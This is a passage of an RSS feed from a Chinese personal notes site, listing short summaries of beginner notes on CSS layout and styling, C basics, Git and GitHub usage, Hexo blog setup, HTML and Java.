      <guid>https://note.yxzi.xyz/note/technology/language/css/%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E5%A4%84%E7%90%86/</guid>
      <description>文本溢出处理 实现单行文本的溢出显示省略号可以直接用 text-overflow:ellipsis 属性来实现，当然还需要加宽度width属来兼容部分浏览。
overflow: hidden; text-overflow: ellipsis; white-space: nowrap; </description>
    </item>
    
    <item>
      <title>Css 渐变</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E6%B8%90%E5%8F%98/</link>
      <pubDate>Tue, 12 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E6%B8%90%E5%8F%98/</guid>
      <description>渐变 background-image: linear-gradient(rgb(48, 47, 47), rgb(177, 177, 175)); </description>
    </item>
    
    <item>
      <title>Css 自适应布局</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E8%87%AA%E9%80%82%E5%BA%94%E5%B8%83%E5%B1%80/</link>
      <pubDate>Tue, 12 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E8%87%AA%E9%80%82%E5%BA%94%E5%B8%83%E5%B1%80/</guid>
      <description>自适应布局 @media screen and (min-width: 720px) { 	/* 当浏览器宽度大于 value 时所应用的样式 */ }  @media screen and (max-width: value) { 	/* 当浏览器宽度小于 value 时所应用的样式*/ } </description>
    </item>
    
    <item>
      <title>Git git status</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-status/</link>
      <pubDate>Tue, 12 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-status/</guid>
      <description>git status 查看当前 git 的状态，即查看工作区代码相对于暂存区的差别。比如哪些文件还在工作区（还没git add）、哪些文件还在暂存区（还没git commit）等等，及时了解当前的 git 状态可以避免一些误操作。
但git status并不能让我们知道这些文件具体修改了什么内容。</description>
    </item>
    
    <item>
      <title>Css table 空隙</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/table-%E7%A9%BA%E9%9A%99/</link>
      <pubDate>Mon, 11 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/table-%E7%A9%BA%E9%9A%99/</guid>
      <description>table 空隙 如果可能，边框会合并为一个单一的边框。会忽略 border-spacing 和 empty-cells 属性。
border-collapse: collapse; </description>
    </item>
    
    <item>
      <title>Css 修改网页滚动条样式</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E4%BF%AE%E6%94%B9%E7%BD%91%E9%A1%B5%E6%BB%9A%E5%8A%A8%E6%9D%A1%E6%A0%B7%E5%BC%8F/</link>
      <pubDate>Sun, 10 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E4%BF%AE%E6%94%B9%E7%BD%91%E9%A1%B5%E6%BB%9A%E5%8A%A8%E6%9D%A1%E6%A0%B7%E5%BC%8F/</guid>
      <description>修改网页滚动条样式 属性描述 /* 整个滚动条*/ ::-webkit-scrollbar { }  /* 滚动条两端的按钮 */ ::-webkit-scrollbar-button { }  /* 滚动条的滚动轨道 */ ::-webkit-scrollbar-track { }  /* 内层轨道 */ ::-webkit-scrollbar-track-piece { }  /* 滑块 */ ::-webkit-scrollbar-thumb { }  /* 边角 */ ::-webkit-scrollbar-corner { }  /* 右下角拖动块的样式 */ ::-webkit-resizer { } 使用 一般我们这样设置这几个主要属性就 OK 了。
/*定义整个滚动条高宽及背景：高宽分别对应横竖滚动条的尺寸*/ ::-webkit-scrollbar { 	width: 10px; 	background-color: #f5f5f5; } /*定义滚动条轨道：内阴影 + 圆角*/ ::-webkit-scrollbar-track { 	background-color: #f5f5f5; } /*定义滑块：内阴影 + 圆角*/ ::-webkit-scrollbar-thumb { 	border-radius: 10px; 	background-color: #555; } 更多相关属性 :horizontal //水平方向的滚动条 :vertical //垂直 方向的滚动条 :decrement //应用于按钮和内层轨道(track piece)。它用来指示按钮或者内层轨道是否会减小视窗的位置(比如，垂直滚动条的上面，水平滚动条的左边。) :increment //decrement类似，用来指示按钮或内层轨道是否会增大视窗的位置(比如，垂直滚动条的下面和水平滚动条的右边。) :start //伪类也应用于按钮和滑块。它用来定义对象是否放到滑块的前面。 :end //类似于start伪类，标识对象是否放到滑块的后面。 :double-button //该伪类以用于按钮和内层轨道。用于判断一个按钮是不是放在滚动条同一端的一对按钮中的一个。对于内层轨道来说，它表示内层轨道是否紧靠一对按钮。 :single-button //类似于double-button伪类。对按钮来说，它用于判断一个按钮是否自己独立的在滚动条的一段。对内层轨道来说，它表示内层轨道是否紧靠一个single-button。 :no-button //用于内层轨道，表示内层轨道是否要滚动到滚动条的终端，比如，滚动条两端没有按钮的时候。 :corner-present //用于所有滚动条轨道，指示滚动条圆角是否显示。 :window-inactive //用于所有的滚动条轨道，指示应用滚动条的某个页面容器(元素)是否当前被激活。 </description>
    </item>
    
    <item>
      <title>Css Body 背景图</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/body-%E8%83%8C%E6%99%AF%E5%9B%BE/</link>
      <pubDate>Sat, 09 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/body-%E8%83%8C%E6%99%AF%E5%9B%BE/</guid>
      <description>Body 背景图 画布 它是一块区域，也叫视口（可视窗口）。
它的最小宽度为视口宽度，最小高度为视口高度。
Html 的背景图 该元素的背景覆盖画布。即给该元素设置背景，相当于设置画布的背景。
Body 的背景图 若根元素有背景，body 元素的背景正常显示。
若根元素没有设置背景，则 body 元素的背景覆盖画布，则会出现不正常的现象，原因为若没有这个规则，就无法给整个网页设置背景。
背景图覆盖画布时 高度：纵向位置百分比、预设值，相对于根元素高度。
宽度：横向位置百分比、预设值，相对于视口。</description>
    </item>
    
    <item>
      <title>Css keyframes</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/keyframes/</link>
      <pubDate>Sat, 09 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/keyframes/</guid>
      <description>Css keyframes 持续旋转 选中文档中的元素。
.map2 { 	width: 8.0375rem; 	height: 8.0375rem; 	background-image: url(../images/lbx.png); 	opacity: 0.6; 	animation: rotate 15s linear infinite; 	z-index: 2; } keyframes @keyframes rotate { 	/* 从 0° 开始旋转 */ 	from { 	transform: translate(-50%, -50%) rotate(0deg); 	} 	/* 旋转到 360 ° */ 	to { 	transform: translate(-50%, -50%) rotate(360deg); 	} } </description>
    </item>
    
    <item>
      <title>italic 和 oblique</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/italic-%E5%92%8C-oblique/</link>
      <pubDate>Sat, 09 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/italic-%E5%92%8C-oblique/</guid>
      <description>italic 和 oblique italic：浏览器会显示一个斜体的字体样式。
oblique：浏览器会显示一个倾斜的字体样式。
可以发现关键之处为斜体和倾斜。
Italic 是使用了文字本身的斜体属性，
oblique 是让没有斜体属性的文字做倾斜处理。
因为有少量的不常用字体没有斜体的属性，
如果我们使用 Italic 就会没有效果，只能 Oblique 使用才能使文字倾斜。</description>
    </item>
    
    <item>
      <title>Css 语法</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E8%AF%AD%E6%B3%95/</link>
      <pubDate>Fri, 08 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E8%AF%AD%E6%B3%95/</guid>
      <description>语法 CSS 的语法通常是一个选择器，用于选择 HTML 文档中的元素。
选择器：位于语法开始，用于选中 HTML 文档中的元素。
声明：以 { 开始，以 } 结束。{ 与 } 必须成对出现。
声明块：由属性与属性值组成。
.selector { 	color: #000; } 使用 内联式：将 CSS 语法书写到元素的 style 属性中，仅对当前元素生效，也叫行内式。
内嵌式：首先将 style 元素书写到 head 元素中，然后将 CSS 语法书写到 style 元素中，也叫内部样式表。
外链式：将 CSS 语法书写到独立的 CSS 文件中，并在 HTML 文档中使用 link 元素引入，也叫外部样式表。
优先级：内联式 &amp;gt; 内嵌式 &amp;gt; 外链式。</description>
    </item>
    
    <item>
      <title>Css 块格式化上下文</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E5%9D%97%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%8A%E4%B8%8B%E6%96%87/</link>
      <pubDate>Thu, 07 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E5%9D%97%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%8A%E4%B8%8B%E6%96%87/</guid>
      <description>块格式化上下文 格式化上下文（Block Formatting Context），它是一块 独立的渲染区域，它规定了在该区域中，普通流块盒的布局。
触发 BFC 的元素  根元素 html，该元素创建的 BFC 覆盖了文档中的所有元素。 浮动元素，float 的值不为 none 的元素。 绝对定位元素，position 的值为 absolute 或 fixed 的元素。 overflow 的值不为 visible 的块盒。 行块盒，display 的值为 inline-block 的元素。 表格单元格，display 的值为 table-cell 的元素，表格单元格默认为该值。 表格标题，display 的值为 table-caption 的元素，表格标题默认为该值。  正常布局流块盒的渲染区域  每个块盒都会参与块格式化上下文的创建。 不同的 BFC，它们进行渲染时互不干扰。 创建 BFC 的元素，隔绝了它内部和外部的联系，内部的渲染不会影响到外部区域。 创建 BFC 的元素，它的所有内容都会被包含在它所创建的 BFC 中  BFC 的作用 解决高度塌陷
创建 BFC 的元素，它的自动高度会计算浮动元素；若只是为了创建 BFC 一般使用副作用最小的方式：设置块盒的 overflow 的属性值为 hidden。仅仅是为了解决高度坍塌，建议使用伪元素 after。
原理：因为它要隔绝内部与外部的关系，而高度坍塌会使元素不在其包含块内，所以它的自动高度必须计算浮动元素，因此创建 BFC 可以解决高度坍塌的问题。
解决浮动流脱离文档流</description>
    </item>
    
    <item>
      <title>Css 画三角形</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E7%94%BB%E4%B8%89%E8%A7%92%E5%BD%A2/</link>
      <pubDate>Thu, 07 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E7%94%BB%E4%B8%89%E8%A7%92%E5%BD%A2/</guid>
      <description>画三角形 .triangle { 	width: 0; 	height: 0; 	border-width: 50px; 	border-style: solid; 	display: inline-block; 	border-color: transparent transparent #008c8c transparent; } </description>
    </item>
    
    <item>
      <title>Css 盒子模型</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/</link>
      <pubDate>Wed, 06 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/</guid>
      <description>盒子模型 前言 在 CSS 中，每一个元素都可以看作是一个盒子，这个盒子由以下几个方面组成。目前常用的有两种盒模型，分别是标准盒模型和怪异盒模型。
一个盒子的组成  内容（content） 内边距（padding） 边框（border） 外边距（margin）  标准盒模型 box-sizing 的值为 content-box 的元素；且浏览器将采用标准模式解析。
盒子总宽度 = width + padding（左右）+ border（左右）+ margin（左右）。
盒子总高度 = height + padding（上下）+ border（上下）+ margin（上下。
怪异盒模型 box-sizing 的值为 border-box 的元素；且浏览器将采用怪异模式（兼容模式）解析，也叫 IE 盒模型。
盒子总宽度 = width + margin（左右），其 width 包含了 padding（左右）和 border（左右）的宽度。
盒子总高度 = width + margin（上下），其 height 包含了 padding（上下）和 border（上下）的高度。</description>
    </item>
    
    <item>
      <title>Css 层叠上下文</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E5%B1%82%E5%8F%A0%E4%B8%8A%E4%B8%8B%E6%96%87/</link>
      <pubDate>Tue, 05 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E5%B1%82%E5%8F%A0%E4%B8%8A%E4%B8%8B%E6%96%87/</guid>
      <description>层叠上下文 它是一块区域，它由某个元素创建，它规定了该区域中的内容在 Z 轴上排列的先后顺序。
它是一种 三维概念。所有的 HTML 元素都根据其元素的属性按照优先级顺序占据这个空间。
规则 只有定位元素设置 z-index 有效。
设置 z-index 值为负数的元素，会被正常流、浮动流覆盖。
z-index 的值，该值越大，则越靠近用户。
所有元素都处于 html 元素的层叠上下文中。
如遇到 z-index 一样的层叠上下文，则比较元素的书写顺序。
层叠上下文的元素，它本身永远被父级包含内，哪怕该元素设置了 z-index:-9999，它也只能包含于自身父元素的层叠上下文中。
每一个层叠上下文的元素，它们都完全独立于同级的元素，当处理层叠上下文时只会考虑自己的子元素。
创建层叠上下文的元素  根元素（html）。 Position 值为 absolute 或 relative 且 z-index 值不为 auto 的元素。 Opacity 的值小于 1 的元素。  优先级  同一个层叠上下文中，元素从底部到顶部的优先级 创建层叠上下文元素的背景和边框。 z-index 的值为负的层叠上下文元素。 常规流非定位元素的块盒。 非定位的浮动流。 常规流非定位行盒。 任何 z-index 属性值为 auto 的定位子元素，以及 z-index 为 0 的元素。 z-index 的值为正的元素。  </description>
    </item>
    
    <item>
      <title>Css 层叠</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E5%B1%82%E5%8F%A0/</link>
      <pubDate>Mon, 04 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E5%B1%82%E5%8F%A0/</guid>
      <description>层叠 层叠是 CSS 的一个基本特征，浏览器通过 优先级 来判断哪些属性值对一个元素最为重要，从而在这个元素上应用这些属性值。
确定声明值 找出样式表中没有冲突的声明，并应用到 CSS 属性，样式声明不冲突则不会发生层叠。
层叠 对样式表中有冲突（同一个元素在样式表中设置了多个相同的属性）的声明使用层叠规则。
比较重要性
 重要性由高到低为 样式表中的 !imliortant 样式（尽量不使用）。 样式表中的普通样式（内联式 &amp;gt; 内嵌式 &amp;gt; 外链式）。 浏览器中的默认样式。  比较优先级
 选择器选中的范围越窄，优先级越高。 通过选择器，计算出一个四位数（xxxx），该四位数越大越则优先级越高。这个四位数的进制为逢 256 进一。 :nth-child()选择器会覆盖:hover选择器  四位数的取值
  千位：内联样式，记作 1，否则记为 0。
  百位：所有 id 选择器的数量。
  十位：所有类选择器、属性选择器、伪类选择器的数量。
  个位：元素选择器、伪元素选择器的数量。
  零：通配符选择器。
  比较源次序
CSS 样式书写靠后的属性最终会应用到元素。
继承 使用继承，对仍然没有值的属性，若可以继承（部分属性是不能继承的，通常情况下，只有跟文字内容有关的属性可以被继承。），则继承其父元素的属性。
当元素的属性有默认值时，该元素一般不会继承父元素的属性。
使用默认值 每个 CSS 在属性都会有默认值，当继承结束后，对于仍然没有值的属性，会使用默认值。</description>
    </item>
    
    <item>
      <title>C break</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/break/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/break/</guid>
      <description>break 用于终止循环或退出 switch.
不能直接用于 if，除非 if 是循环的一个子句。</description>
    </item>
    
    <item>
      <title>C 自增与自减</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E8%87%AA%E5%A2%9E%E4%B8%8E%E8%87%AA%E5%87%8F/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E8%87%AA%E5%A2%9E%E4%B8%8E%E8%87%AA%E5%87%8F/</guid>
      <description>自增与自减 前自增++i与后自增 i++.
异同 相同
最终都会使 i 的值加 1.
不同
i++返回原来的值，
++i返回加 1 后的值。
#include &amp;lt;stdio.h&amp;gt; int main() {  int a,b,c,d;  a = b = 3;  // return 3  c = a++;  // return 4  d = ++b;  printf(&amp;#34;c = %d\nd = %d&amp;#34;,c,d);  return 0; } </description>
    </item>
    
    <item>
      <title>C 预备知识</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/</guid>
      <description>预备知识 六大硬件的关系 双击（操作系统给用户提供的一个操作）打开一个存放在硬盘中的视频。
因为 CPU 并不能直接处理硬盘上的数据，所以会将硬盘上的视频数据拷贝到内存中。
CPU 再对内存中的数据进行处理。
因为 CPU、内存、显卡（控制显示器的正确显示）、硬盘都是安装在主板上的，因此主板是一个组织它们如何有效运行的硬件。
程序是如何运行的 编译 —— 建立链接（生成一个格式为 exe 的可执行文件）—— 调用操作系统，操作系统再调用 CPU 并执行这个 exe 文件，最后会在显示器上看到这个软件的运行结果 。
软件不能直接控制硬件。
什么是变量 变量的本质是将一个空闲的内存空间与某个变量产生联系。
int a; //调用操作系统在内存条中创建一个空的内存空间，并将变量 a 自动分配到该内存空间中，使得变量 a 与该内存空间的地址编号产生一个一一对应的关系 a = 3; //将 3 放入变量 a 的内存空间内。  软件运行与内存的关系 一个软件在运行前需要请求操作系统将硬盘中的数据拷贝到内存中，并使用 CPU 启动该软件。
一个软件运行时，它所占的储存空间不会再分配给其他程序使用。
当软件运行完毕后，操作系统将释放该储存空间，（但操作系统并不会清空该内存空间中软件残留下来的数据，所以下次使用该内存空间时，很可能该内存空间中存在着其他软件所残留的垃圾数据。），以便再次分配给其他软件使用。
常量的表示 整数。 八进制：前面加 0 ，018。
十进制：传统写法，18。
十六进制：前面加 0x 或 0X，0x18。
浮点数。 传统写法，1.8。
科学计数法，1.8e2（1.8 * 10 的 2 次方）。
字符 单个字符用单引号括起来，&amp;lsquo;Y&amp;rsquo;。
多个字符或单个字符都可以用双引号括起来，所有的字符串都会在末尾添加 \0（结束符），&amp;ldquo;Y\0&amp;rdquo;。
常量是怎么存储在计算机中的 整数是以补码的形式转换为二进制储存在计算机中。</description>
    </item>
    
    <item>
      <title>Css 布局</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E5%B8%83%E5%B1%80/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E5%B8%83%E5%B1%80/</guid>
      <description>布局 正常流布局  默认情况下，所有元素都属于正常流。 块盒独占一行。 行盒水平依次排列。 包含块：每个盒子都有它的包含块，包含块决定了该盒子的排列范围。 在正常布局流中，元素的包含块，都是该元素父元素的内容盒。  margin 合并 多个同级且相邻的正常布局流块盒，当它们的上下margin相邻，则会合并为一个margin。
 两个外边距值都是正数，则取较大值； 两个值都是负数，则取较大值； 一正一负则取两个值的和，  该情况可以触发 BFC 解决。
margin 塌陷 正常布局流中的呈父子关系的块盒，如果父元素没有设置上下内边距或上下边框，则子元素的上下margin就会和父元素的上下margin重合，且这时如果设置子元素的上下margin，相当于设置父元素的margin。
该情况可以触发 BFC 解决。
浮动流布局  使元素向左上或向右上排列。 通常情况，浮动元素会无视正常布局元素，它会将正常布局元素覆盖。 在一行浮动元素中，若父元素装不下所有的浮动元素，则多余的浮动元素会自动向下移动，直到具备足够的空间能容纳这些多余的浮动元素，才向左或向右移动。 行盒在排列时，默认会避开浮动元素（单独的文字也是行盒，因为浏览器会自动生成一个行盒包裹单独的文字，该行盒为匿名行盒）。 浮动元素一定是块盒。 不会发生 margin 合并。 脱离正常布局流。  高度塌陷 正常布局流元素高度自适应，它的子元素浮动后，该元素在计算高度时，不会考虑浮动后的子元素的高度，则会导致该元素高度为 0，这种情况称为高度塌陷。
解决：
利用伪元素 after 清除浮动即可解决。
定位流布局 使一个元素从它原本在正常布局流中应该在的位置移动到另一个位置。
相对定位   使元素在原来位置上进行偏移；若没有设置偏移量，对元素本身没有任何影响。
  提升元素层级（z-index）。
  盒子的偏移不会对其他盒子造成任何影响。
  脱离正常布局流。
  尽管元素被偏移了，但它仍然占据着它没偏移前的空间。
  绝对定位   它相对于 static 定位以外的第一个父元素进行定位；若没有，则它的包含块为整个网页（初始化包含块），原位置不会被保留。</description>
    </item>
    
    <item>
      <title>Github</title>
      <link>https://note.yxzi.xyz/note/technology/git/github/github/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/github/github/</guid>
      <description>Github Github 不但可以是一个个人的免费仓库，它还是一个开源协作社区，通过 GitHub ，既可以让别人参与你的开源项目，也可以参与别人的开源项目。
参与一个的开源项目 克隆他人的开源项目 访问该项目的主页。
点击Fork先克隆这个的项目到自己的远程仓库中。
使用git clone将这个项目从自己的远程仓库中clone到本地。
git clone git@github.com:YxzRainy/YxzRainy.github.io.git 一定要从自己的账号下 clone 仓库，这样你才能推送修改。如果从别人的仓库地址克隆，你将不能推送修改，因为你没有权限。
如果你想修复这个开源的一个 bug，或者新增一个功能，立刻就可以开始干活，干完后，往自己的仓库推送。</description>
    </item>
    
    <item>
      <title>Hexo 将博客作为站点子页面</title>
      <link>https://note.yxzi.xyz/note/technology/frame/hexo/%E5%B0%86%E5%8D%9A%E5%AE%A2%E4%BD%9C%E4%B8%BA%E7%AB%99%E7%82%B9%E5%AD%90%E9%A1%B5%E9%9D%A2/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/hexo/%E5%B0%86%E5%8D%9A%E5%AE%A2%E4%BD%9C%E4%B8%BA%E7%AB%99%E7%82%B9%E5%AD%90%E9%A1%B5%E9%9D%A2/</guid>
      <description>Hexo 将博客作为站点子页面 前言 如果你想如何在 GitHub 的 repository 中上传自己写的网页作为首页，hexo 生成的博客页作为其子页？即自己写的页面作为 UserName.github.io 的页面，将 hexo 博客放在 UserName.github.io/blog 上，那么，这个教程也许可以帮到你。
本教程的前提是你已经用 hexo 将博客搭建在 UserName.github.io 的仓库上了。
新建仓库 在 github 上新建一个仓库，名字随意，我的是 Blog。
然后本地初始化一个 master 分支，并且将原仓库 clone 到本地分支，并且 开启仓库的 GitHub Pages.，需要注意的是，这里的本地分支目前是没有 CNAME 文件 的。
修改 Hexo 的配置文件 打开配置文件 _config.yml，找到 #URL 下的 url 和 root，将 url 修改为https:// UesrName.github.io/新建的仓库名（我这里是 Blog），然后将 root 修改为**/新建的仓库名/**。
# URL ## Set your site url here. For example, if you use GitHub Page, set url as &amp;#39;https://username.</description>
    </item>
    
    <item>
      <title>Hexo 搭建博客</title>
      <link>https://note.yxzi.xyz/note/technology/frame/hexo/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/hexo/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</guid>
      <description>Hexo 搭建博客 创建 Github 仓库 注册一个Github账号 创建 Github Repository 在 Github 上创建一个仓库，仓库名必须为 UserName.github.io，注意，这是固定的写法 。
将 Git 与 Github 关联 下载并安装Git 配置个人信息 git config --global user.name &amp;#34;Your UserName&amp;#34; git config --global user.email &amp;#34;YourEmail@qq.com&amp;#34; 生成 ssh 密钥文件 hexo d 到远程仓库，因为每一台电脑中的私钥只有只有一个，因此当你想给另一个 github 账号配置博客时，必须重新生成公钥和私钥
ssh-keygen -t rsa -C &amp;#34;Your GitHub 的邮箱&amp;#34; 复制 id_rsa pub 文件中的密钥 三个回车，默认不需要设置密码，之后到所显示的路径中找到生成的 ssh 的文件夹中的 id_rsa pub 密钥，将其中内容全部复制
new SSH Key 打开你的 Github 的主页，点击头像，选择 Settings，再选择 SSH and GPG keys，找到 SSH keys，点击 New SSH Key，Title 为标题，任意填写，将刚刚复制的 id_rsa pub 文件中的密钥文本粘贴进去，最后 Add SSH key。</description>
    </item>
    
    <item>
      <title>Hexo 更改博客主题</title>
      <link>https://note.yxzi.xyz/note/technology/frame/hexo/%E6%9B%B4%E6%94%B9%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/hexo/%E6%9B%B4%E6%94%B9%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98/</guid>
      <description>Hexo 更改博客主题 前言 配置完了 Hexo，你是否对自带的主题不满意呢？本篇文章将教你如何更改及美化 Hexo 主题。
下载主题 去 Hexo 的Hexo Themes下载一个你认为不错的主题。这里推荐 Next主题
更改基本站点信息 在你的博客根目录下打开**_config.yml**，将 Site 下的信息改为你自己的
# Site title: Rainy 的梦呓 subtitle: &amp;#39;至简&amp;#39; description: &amp;#39;My Blog And Note to sum up&amp;#39; keywords: Blog note author: Yxz language: zh-CN timezone: &amp;#39;Asia/Shanghai&amp;#39; 同时 记得将 URL 下的 url 改为你自己的站点地址
# URL ## Set your site url here. For example, if you use GitHub Page, set url as &amp;#39;https://username.github.io/project&amp;#39; url: https://YxzRainy.github.io/Blog 切换到 Next 主题 在你的博客根目录下打开**_config.</description>
    </item>
    
    <item>
      <title>HTML img 的常见问题</title>
      <link>https://note.yxzi.xyz/note/technology/language/html/img-%E7%9A%84%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/html/img-%E7%9A%84%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</guid>
      <description>img 的常见问题 关于无法设置宽高 如果该元素的图像链接失效，则该元素的特性会与行盒一样，无法设置宽高；如果想要图像链接失效后仍具有宽高，可以将该元素设置为块盒或者行块盒。
关于图像底部的留白 当任何一个元素（例如 div）内包含行盒（例如 img）时，该 img 行盒就会在这个 div 元素的内部创建参考线，即这个 div 元素在没有设置下外边距的情况下，img 元素的基线（下外边距的底部）会与父元素的基线对齐（即留白部分就是 img 元素的下外边距），因此导致图像底部有留白。
解决方法：
 第一种是将父元素的字体大小设置为零，则父元素的内部就不会产生参考线。 第二种是将 img 元素设置为块盒，因此其父元素的内部就没有包含行盒，因此不会在其父元素内部产生参考线。  </description>
    </item>
    
    <item>
      <title>HTML 元素语义化</title>
      <link>https://note.yxzi.xyz/note/technology/language/html/%E5%85%83%E7%B4%A0%E8%AF%AD%E4%B9%89%E5%8C%96/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/html/%E5%85%83%E7%B4%A0%E8%AF%AD%E4%B9%89%E5%8C%96/</guid>
      <description>元素语义化 前言 在 HTML 5 中，新增了许多元素，这些不同的元素都有不同的含义，因此语义化指的是用最合理、最恰当的元素来标记网页内容，使得机器也可以知道页面中有哪些元素，比如，文章、标题、或是段落。
语义化的优点  使文档在没有 CSS 样式的条件下，也能很好地呈现出内容结构。 使文档结构变的清晰，更具可读性，且利于后期的代码维护。 方便其他设备解析（屏幕阅读器、盲人阅读器、移动设备等）。 有利于 SEO。  </description>
    </item>
    
    <item>
      <title>htm、html、shtml 后缀的区别</title>
      <link>https://note.yxzi.xyz/note/technology/language/html/htmhtmlshtml-%E5%90%8E%E7%BC%80%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/html/htmhtmlshtml-%E5%90%8E%E7%BC%80%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
      <description>htm、html、shtml 后缀的区别 首先 htm、html、shtml 都是静态网页的后缀，三者也可以说都是只是扩展名不同，其他一样，都是静态的网页。
Htm 和 html 是完全静态的网页不通过服务器编译解释直接送出给浏览器读取的静态网页，以 htm 和 html 伪静态 Request 除外。
html、htm、shtml、shtm 均是静态 html 网页，都是网页文件后缀名不同的 html 网页扩展名。
htm html 与 htm 均是静态网页后缀名，网页文件没有区别与区分，html 与 htm 后缀网页后缀可以互换，对网页完全没有影响同时也没有区别。可以认为 html 与 htm 没有本质区别，只是两者适用于不同的运行环境（DOS 和 UNIX）之下。
shtml shtml 命名的网页文件里，使用了 ssi 的一些指令，就像 asp 中的指令，你可以在 SHTML 文件中写入 SSI 指令，当客户端访问这些 shtml 文件时，服务器端会把这些 SHTML 文件进行读取和解释，把 SHTML 文件中包含的 SSI 指令解释出来。</description>
    </item>
    
    <item>
      <title>Issus</title>
      <link>https://note.yxzi.xyz/note/technology/git/github/issus/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/github/issus/</guid>
      <description>Issus 你可以提出 issue，供看到这个问题的任何人参与解决、讨论这个 issue，当 issue 得到解决时，仓库的所有者与 issue 的所有者就可以将这个 issue 关闭了。</description>
    </item>
    
    <item>
      <title>Java 基础</title>
      <link>https://note.yxzi.xyz/note/technology/language/java/java-%E5%9F%BA%E7%A1%80/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/java/java-%E5%9F%BA%E7%A1%80/</guid>
      <description>基础 类、对象 、属性、封装 类可以理解成对象的集合。比如 class person，定义一个人物类，这是一个抽象的概念。
